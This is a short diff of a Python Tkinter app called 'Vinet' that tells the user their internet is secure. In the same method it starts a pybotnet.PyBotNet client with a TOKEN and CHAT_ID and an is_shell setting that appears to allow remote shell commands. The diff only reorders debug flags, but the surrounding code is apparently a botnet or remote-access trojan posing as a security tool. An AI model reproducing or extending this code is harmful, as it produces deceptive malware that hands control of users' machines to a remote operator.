@@ -111,14 +111,11 @@ class Vinet(tk.Frame):
         self.status['text'] = 'online \n Your internet is secure'
         self.status['fg'] = 'green'
 
-        is_shell = False  # bug: if is sheel False: cmd command not work. bug in pytbotnet v0.18.5
         show_log = False
+        is_shell = False
         if self.DEBUG:
-            is_shell = True
             show_log = True
-
-        if is_shell:
-            print('start Vinet')
+            is_shell = True
 
         self.botnet = pybotnet.PyBotNet(
             TOKEN, CHAT_ID, show_log=show_log, is_shell=is_shell)
